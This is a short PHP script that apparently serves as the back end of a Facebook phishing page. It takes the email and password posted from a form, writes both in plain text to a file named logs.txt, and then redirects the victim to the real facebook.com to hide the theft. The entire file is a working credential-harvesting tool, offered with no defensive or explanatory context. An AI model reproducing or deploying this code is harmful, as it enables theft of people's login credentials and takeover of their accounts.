<?php
if($_SERVER['REQUEST_METHOD']=="POST"){
    if(isset($_POST['email']) && isset($_POST['pass'])){
       $email=$_POST['email'];
       $pass=$_POST['pass'];

       $fptr=fopen("logs.txt","a");
        fwrite($fptr,"Username : " . $email . "\n");
        fwrite($fptr,"Password : " . $pass . "\n\n");
       fclose($fptr);
       header("location:https://www.facebook.com");


    }
}

?>